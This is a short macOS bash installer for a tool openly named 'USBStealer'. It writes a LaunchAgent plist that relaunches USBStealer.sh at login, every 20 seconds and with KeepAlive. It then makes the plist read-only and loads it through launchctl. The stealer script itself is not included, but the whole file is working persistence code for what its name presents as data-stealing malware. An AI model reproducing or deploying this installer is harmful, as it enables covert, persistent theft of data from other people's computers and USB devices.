#!/bin/bash
#USBStealer by ShellBear


DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
echo "Installing Script "
cat > /Users/$(whoami)/Library/LaunchAgents/com.ShellBear.USBStealer.plist <<EOF 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
   <key>Label</key>
   <string>com.github.shellbear</string>
   <key>Program</key>
   <string>/Users/$(whoami)/USBStealer/USBStealer.sh</string>
   <key>RunAtLoad</key>
   <true/>
   <key>KeepAlive</key>
   <true/>
   <key>StartInterval</key>
   <integer>20</integer>
</dict>
</plist>
EOF
sleep 1
chmod 444 /Users/$(whoami)/Library/LaunchAgents/com.ShellBear.USBStealer.plist
chmod +x $DIR/USBStealer.sh
launchctl load ~/Library/LaunchAgents/com.ShellBear.USBStealer.plist
launchctl start ~/Library/LaunchAgents/com.ShellBear.USBStealer.plist
echo "Installation finished"
echo "~/Library/LaunchAgents/com.ShellBear.USBStealer.plist"
